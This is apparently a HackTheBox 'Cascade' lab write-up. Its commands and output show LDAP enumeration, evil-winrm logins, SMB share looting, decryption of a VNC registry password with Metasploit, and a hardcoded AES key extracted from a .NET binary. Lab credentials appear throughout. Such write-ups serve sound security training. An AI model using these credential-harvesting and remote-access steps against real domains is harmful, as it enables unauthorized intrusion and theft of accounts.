+distinguishedName: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Adrian Turnbull
+name: Adrian Turnbull
+badPwdCount: 0
+pwdLastSet: 132233533933579732
+sAMAccountName: a.turnbull
+userPrincipalName: a.turnbull@cascade.local
+givenName: Edward
+distinguishedName: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Edward Crowe
+name: Edward Crowe
+badPwdCount: 0
+pwdLastSet: 132233607021669462
+sAMAccountName: e.crowe
+userPrincipalName: e.crowe@cascade.local
+givenName: Ben
+distinguishedName: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Ben Hanson
+name: Ben Hanson
+badPwdCount: 0
+pwdLastSet: 132234069391538655
+sAMAccountName: b.hanson
+userPrincipalName: b.hanson@cascade.local
+givenName: David
+distinguishedName: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: David Burman
+name: David Burman
+badPwdCount: 0
+pwdLastSet: 132234069729591249
+sAMAccountName: d.burman
+userPrincipalName: d.burman@cascade.local
+distinguishedName: OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+name: Services
+distinguishedName: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: ArkSvc
+name: ArkSvc
+badPwdCount: 0
+pwdLastSet: 132230603002172876
+sAMAccountName: arksvc
+userPrincipalName: arksvc@cascade.local
+distinguishedName: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Util
+name: Util
+badPwdCount: 0
+pwdLastSet: 132233548311955855
+sAMAccountName: util
+userPrincipalName: util@cascade.local
+givenName: BackupSvc
+distinguishedName: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: BackupSvc
+name: BackupSvc
+badPwdCount: 0
+pwdLastSet: 132234070231912131
+sAMAccountName: BackupSvc
+userPrincipalName: BackupSvc@cascade.local
+givenName: Joseph
+distinguishedName: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Joseph Allen
+name: Joseph Allen
+badPwdCount: 0
+pwdLastSet: 132234098399165604
+sAMAccountName: j.allen
+userPrincipalName: j.allen@cascade.local
+givenName: Ian
+distinguishedName: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
+displayName: Ian Croft
+name: Ian Croft
+badPwdCount: 0
+pwdLastSet: 132235983818652005
+sAMAccountName: i.croft
+userPrincipalName: i.croft@cascade.local
+distinguishedName: OU=Computers,OU=UK,DC=cascade,DC=local
+name: Computers
+distinguishedName: OU=Groups,OU=UK,DC=cascade,DC=local
+name: Groups
+distinguishedName: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+name: IT
+sAMAccountName: IT
+distinguishedName: CN=Production,OU=Groups,OU=UK,DC=cascade,DC=local
+name: Production
+sAMAccountName: Production
+distinguishedName: CN=HR,OU=Groups,OU=UK,DC=cascade,DC=local
+name: HR
+sAMAccountName: HR
+distinguishedName: CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local
+name: AD Recycle Bin
+sAMAccountName: AD Recycle Bin
+distinguishedName: CN=Backup,OU=Groups,OU=UK,DC=cascade,DC=local
+name: Backup
+sAMAccountName: Backup
+distinguishedName: CN=Temps,OU=Groups,OU=UK,DC=cascade,DC=local
+name: Temps
+sAMAccountName: Temps
+distinguishedName: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=lo
+name: Remote Management Users
+sAMAccountName: Remote Management Users
+distinguishedName: CN=Factory,OU=Groups,OU=UK,DC=cascade,DC=local
+name: Factory
+sAMAccountName: Factory
+distinguishedName: CN=Finance,OU=Groups,OU=UK,DC=cascade,DC=local
+name: Finance
+sAMAccountName: Finance
+distinguishedName: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
+name: Audit Share
+sAMAccountName: Audit Share
+distinguishedName: CN=Data Share,OU=Groups,OU=UK,DC=cascade,DC=local
+name: Data Share
+sAMAccountName: Data Share
+</code></pre><h2 id="18bd1b9f-8847-81dc-8c58-fdb62a462dd6" class="">Findings</h2><ul id="18bd1b9f-8847-8179-a06d-edcb32ec6a04" class="bulleted-list"><li style="list-style-type:disc">Users</li></ul><ul id="18bd1b9f-8847-80b8-a43e-c2e8f4f632e5" class="bulleted-list"><li style="list-style-type:disc">One possible pwd</li></ul><h1 id="18bd1b9f-8847-81bb-a45c-d470b2b21007" class="">User</h1><h3 id="18bd1b9f-8847-803d-b627-ff482278aac3" class="">Evil_winrm</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80be-bcec-d39b17388978" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ evil-winrm -i 10.10.10.182 -u r.thompson -p &#x27;clk0bjVldmE=&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+Error: Exiting with code 1
+</code></pre><h3 id="18bd1b9f-8847-8023-9ea4-e63a1b122712" class="">Decode pass &amp; try again but nothing</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80b2-b709-fa861747b439" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ echo &quot;clk0bjVldmE=&quot; | base64 -d
+rY4n5eva    </code></pre><h3 id="18bd1b9f-8847-80a9-8c7b-c99c3cae637e" class="">Try with smbclient</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8038-ace4-f084739f184d" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ smbclient -U &#x27;r.thompson&#x27; -L \\10.10.10.182           
+Password for [WORKGROUP\r.thompson]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	Audit$          Disk      
+	C$              Disk      Default share
+	Data            Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	print$          Disk      Printer Drivers
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8021-aa8e-faef772b2a3b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ smbclient -U &#x27;r.thompson&#x27; \\\\10.10.10.182\\Data
+Password for [WORKGROUP\r.thompson]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sun Jan 26 22:27:34 2020
+  ..                                  D        0  Sun Jan 26 22:27:34 2020
+  Contractors                         D        0  Sun Jan 12 20:45:11 2020
+  Finance                             D        0  Sun Jan 12 20:45:06 2020
+  IT                                  D        0  Tue Jan 28 13:04:51 2020
+  Production                          D        0  Sun Jan 12 20:45:18 2020
+  Temps                               D        0  Sun Jan 12 20:45:15 2020
+
+		6553343 blocks of size 4096. 1624876 blocks available
+</code></pre><h3 id="18bd1b9f-8847-80f8-bf22-f15d9decb145" class="">Extracting files</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80fe-bce5-ee6153f57501" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">smb: \IT\Temp\s.smith\&gt; get &quot;VNC Install.reg&quot;
+getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (5.7 KiloBytes/sec) (average 5.7 KiloBytes/sec)
+smb: \IT\Email Archives\&gt; get Meeting_Notes_June_2018.html 
+getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (5.4 KiloBytes/sec) (average 5.6 KiloBytes/sec)
+smb: \IT\Logs\Ark AD Recycle Bin\&gt; get ArkAdRecycleBin.log 
+getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (2.8 KiloBytes/sec) (average 4.6 KiloBytes/sec)
+smb: \IT\Logs\DCs\&gt; get dcdiag.log 
+getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (12.7 KiloBytes/sec) (average 6.7 KiloBytes/sec)
+
+</code></pre><h3 id="18bd1b9f-8847-8039-af34-c7a3359a8c61" class="">meeting_notes_june_2018.html</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80eb-84b4-d1978fe43a6d" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">From:                                         Steve Smith
+
+To:                                               IT (Internal)
+
+Sent:                                           14 June 2018 14:07
+
+Subject:                                     Meeting Notes
+
+ 
+
+For anyone that missed yesterday’s meeting (I’m looking at you Ben). Main points are below:
+
+ 
+
+-- New production network will be going live on Wednesday so keep an eye out for any issues.
+
+-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).
+
+-- The winner of the “Best GPO” competition will be announced on Friday so get your submissions in soon.
+
+ 
+
+Steve</code></pre><h3 id="18bd1b9f-8847-8005-b6ce-dee329fa65b0" class="">VNC install.reg</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80d1-b805-e25f4139ff32" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></pre><h3 id="18bd1b9f-8847-809b-9957-c173bf134c02" class="">Decrypt following these <a href="https://github.com/frizb/PasswordDecrypts">steps</a></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80de-a7a9-c066556f5957" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ msfconsole                             
+Metasploit tip: View a module&#x27;s description using info, or the enhanced 
+version in your browser with info -d
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt; irb
+[*] Starting IRB shell...
+[*] You are in the &quot;framework&quot; object
+
+irb: warn: can&#x27;t alias jobs from irb_jobs.
+&gt;&gt; fixedkey = &quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot;
+=&gt; &quot;\x17Rk\x06#NX\a&quot;
+&gt;&gt; require &#x27;rex/proto/rfb&#x27;
+=&gt; true
+&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&quot;6bcf2a4b6e5aca0f&quot;].pack(&#x27;H*&#x27;), fixedkey
+=&gt; &quot;sT333ve2&quot;
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-802a-8162-f71d69cf6db7" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ evil-winrm -i 10.10.10.182 -u s.smith -p &#x27;sT333ve2&#x27;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; type ../Desktop/user.txt
+1******************************1
+</code></pre><h1 id="18bd1b9f-8847-8116-ab0a-cdc2caade54c" class="">Root</h1><h3 id="18bd1b9f-8847-806c-8d39-e627a8efe238" class="">Gather info</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8058-ae1e-deeb56bdad62" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Shares&gt; net user s.smith
+User name                    s.smith
+Full Name                    Steve Smith
+Comment
+User&#x27;s comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/28/2020 7:58:05 PM
+Password expires             Never
+Password changeable          1/28/2020 7:58:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 MapAuditDrive.vbs
+User profile
+Home directory
+Last logon                   1/30/2025 5:21:14 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Audit Share          *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+</code></pre><h3 id="18bd1b9f-8847-809b-8cb2-f71687929337" class="">smb</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80e0-97b9-e3a6d6459519" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Cascade]
+└─$ smbclient -U &#x27;s.smith&#x27; \\\\10.10.10.182\\Audit$
+Password for [WORKGROUP\s.smith]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Wed Jan 29 13:01:26 2020
+  ..                                  D        0  Wed Jan 29 13:01:26 2020
+  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
+  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
+  DB                                  D        0  Tue Jan 28 16:40:59 2020
+  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 01:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 01:38:38 2019
+  x64                                 D        0  Sun Jan 26 17:25:27 2020
+  x86                                 D        0  Sun Jan 26 17:25:27 2020
+
+		6553343 blocks of size 4096. 1624717 blocks available
+smb: \&gt; cd DB
+smb: \DB\&gt; dir
+  .                                   D        0  Tue Jan 28 16:40:59 2020
+  ..                                  D        0  Tue Jan 28 16:40:59 2020
+  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020
+
+		6553343 blocks of size 4096. 1624975 blocks available
+</code></pre><h3 id="18bd1b9f-8847-8066-b675-dd97ed9962d9" class="">Open DB and you’ll see “ArkSvc” with pwd</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-80ce-9a50-daa3f12a1bbe" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">ArkSvc:BQO5l5Kj9MdErXx6Q6AGOw==</code></pre><h3 id="18bd1b9f-8847-80f1-b9ac-de3b34f07605" class="">Wasn’t able to decrypt, let’s gather more info</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-805e-a73d-d4db5551932a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">smb: \&gt; get RunAudit.bat
+getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 24.9 KiloBytes/sec)
+smb: \&gt; get CascAudit.exe
+getting file \CascAudit.exe of size 13312 as CascAudit.exe (28.3 KiloBytes/sec) (average 35.9 KiloBytes/sec)</code></pre><h3 id="18bd1b9f-8847-806e-97c9-edec88e2dad5" class=""><a href="https://github.com/dnSpy/dnSpy/releases">dnspy</a> to reverse engineering</h3><figure id="18bd1b9f-8847-8082-adf4-efb181347cf7" class="image"><a href="../img/Cascade/image.png"><img style="width:709.984375px" src="../img/Cascade/image.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-8045-bc87-d80a22151a9f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">password = Crypto.DecryptString(text, &quot;c4scadek3y654321&quot;);</code></pre><h3 id="18bd1b9f-8847-80cc-a8ed-c509fd93e424" class="">Download all files(dll) and play with debugger</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18bd1b9f-8847-805f-b630-c1642aaf80e9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">smb: \&gt; get System.Data.SQLite.dll
+getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (512.3 KiloBytes/sec) (average 157.8 KiloBytes/sec)
+smb: \&gt; get System.Data.SQLite.EF6.dll
+getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (391.6 KiloBytes/sec) (average 193.0 KiloBytes/sec)
+smb: \&gt; get CascCrypto.dll
+getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (25.8 KiloBytes/sec) (average 171.2 KiloBytes/sec)
+smb: \x64\&gt; dir
+  .                                   D        0  Sun Jan 26 17:25:27 2020
+  ..                                  D        0  Sun Jan 26 17:25:27 2020
+  SQLite.Interop.dll                  A  1639936  Sun Oct 27 01:39:20 2019
+
+		6553343 blocks of size 4096. 1624556 blocks available
+smb: \x64\&gt; get SQLite.Interop.dll 
+getting file \x64\SQLite.Interop.dll of size 1639936 as SQLite.Interop.dll (2651.5 KiloBytes/sec) (average 530.3 KiloBytes/sec)
+
